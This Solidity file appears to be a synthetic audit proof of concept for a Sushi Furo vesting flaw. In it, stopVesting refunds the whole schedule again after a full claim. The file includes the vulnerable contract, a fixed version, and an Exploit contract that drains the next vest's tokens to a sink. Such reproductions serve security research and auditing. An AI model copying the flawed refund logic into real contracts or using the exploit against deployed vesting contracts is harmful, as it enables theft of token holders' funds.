// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sushi Furo vesting — stopVesting returns the amount already claimed
    (Sigma Prime, finding 19587).
    SYNTHETIC, cheatcode-free. This is stopVesting, not cancelStream.
    returnAmount subtracts canClaim, and canClaim is zero once the recipient
    has claimed the fully vested schedule (@> VULN). The owner is paid the
    full 1000 again. That 1000 is the next vest's tokens. The control
    subtracts amountVested, so the return is 0. */

contract MockToken {
    string public name = "VEST";
    string public symbol = "VEST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {}

contract Vesting {
    struct Vest {
        uint256 cliffAmount;
        uint256 steps;
        uint256 stepAmount;
        uint256 claimed;
        uint256 startTime;
        uint256 endTime;
        address owner;
    }

    MockToken public token;
    Vest public vest;
    uint256 public returnAmountPaid;

    constructor(address _token) {
        token = MockToken(_token);
    }

    function open(address owner, uint256 claimed) external {
        vest = Vest({
            cliffAmount: 0,
            steps: 4,
            stepAmount: 250 ether,
            claimed: claimed,
            startTime: 0,
            endTime: block.timestamp,
            owner: owner
        });
    }

    function _balanceOf(Vest memory v) internal view returns (uint256) {
        if (block.timestamp >= v.endTime) {
            return v.cliffAmount + (v.steps * v.stepAmount);
        }
        return 0;
    }

    function stopVesting() external {
        Vest memory v = vest;
        uint256 canClaim = _balanceOf(v) - v.claimed;
        // @> VULN: canClaim is 0 after a full claim, so returnAmount is the whole schedule again
        uint256 returnAmount = (v.cliffAmount + (v.steps * v.stepAmount)) - canClaim;
        token.transfer(v.owner, returnAmount);
        returnAmountPaid = returnAmount;
    }
}

contract VestingFixed {
    struct Vest {
        uint256 cliffAmount;
        uint256 steps;
        uint256 stepAmount;
        uint256 claimed;
        uint256 startTime;
        uint256 endTime;
        address owner;
    }

    MockToken public token;
    Vest public vest;
    uint256 public returnAmountPaid;

    constructor(address _token) {
        token = MockToken(_token);
    }

    function open(address owner, uint256 claimed) external {
        vest = Vest({
            cliffAmount: 0,
            steps: 4,
            stepAmount: 250 ether,
            claimed: claimed,
            startTime: 0,
            endTime: block.timestamp,
            owner: owner
        });
    }

    function _balanceOf(Vest memory v) internal view returns (uint256) {
        if (block.timestamp >= v.endTime) {
            return v.cliffAmount + (v.steps * v.stepAmount);
        }
        return 0;
    }

    function stopVesting() external {
        Vest memory v = vest;
        uint256 amountVested = _balanceOf(v);
        uint256 canClaim = amountVested - v.claimed;
        // FIX: subtract the vested amount, not the still-claimable remainder
        uint256 returnAmount = (v.cliffAmount + (v.steps * v.stepAmount)) - amountVested;
        if (returnAmount > 0) token.transfer(v.owner, returnAmount);
        returnAmountPaid = returnAmount;
        canClaim;
    }
}

contract Exploit {
    MockToken public token;
    Vesting public vesting;
    Sink public sink;
    uint256 public constant TOTAL = 1_000 ether;
    uint256 public nextVestBook = 1_000 ether;

    constructor() {
        token = new MockToken();
        vesting = new Vesting(address(token));
        sink = new Sink();
    }

    function run() external {
        vesting.open(address(this), TOTAL);
        token.mint(address(vesting), nextVestBook);
        vesting.stopVesting();
        require(vesting.returnAmountPaid() == TOTAL, "returned the claimed 1000");
        require(token.balanceOf(address(this)) == TOTAL, "owner received 1000");
        require(token.balanceOf(address(vesting)) == 0, "next vest drained");
        token.transfer(address(sink), TOTAL);
        require(token.balanceOf(address(sink)) == TOTAL, "stolen");
    }
}
